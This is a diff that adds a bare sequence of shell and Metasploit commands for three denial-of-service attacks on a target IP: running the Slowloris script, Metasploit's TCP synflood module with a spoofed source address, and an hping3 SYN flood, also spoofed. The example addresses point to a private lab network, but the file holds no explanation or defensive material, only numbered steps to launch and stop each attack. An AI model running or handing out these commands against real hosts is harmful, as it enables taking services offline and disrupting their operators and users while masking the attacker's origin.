@@ -1,0 +1,47 @@
+# 1. Clone Slowloris (if not already done)
+git clone https://github.com/gkbrk/slowloris.git
+
+# 2. Navigate to directory
+cd slowloris
+
+# 3. Run Slowloris (Example: Target 192.168.56.101, Port 80, 1200 sockets)
+python3 slowloris.py -p 80 -s <NUM_SOCKETS> <TARGET_IP>
+
+# 4. Stop the attack
+Ctrl + C
+
+
+
+
+# 1. Launch Metasploit
+msfconsole
+
+# 2. Use the module
+use auxiliary/dos/tcp/synflood
+
+# 3. Set target IP (Example: 192.168.56.101)
+set RHOSTS <TARGET_IP>
+
+# 4. Set spoofed source IP (Example: 192.168.56.200)
+set SHOST <SPOOFED_IP>
+
+# 5. Set target port (Optional, default is 80)
+# set RPORT 80
+
+# 6. Run the attack
+run
+
+# 7. Stop the attack
+Ctrl + C
+
+
+
+
+# 1. Gain root access
+sudo su
+
+# 2. Execute hping3 (Example: Target 192.168.56.101, Spoof 192.168.56.200, Port 80)
+hping3 -S <TARGET_IP> -a <SPOOFED_IP> -p 80 --flood
+
+# 3. Stop the attack
+Ctrl + C
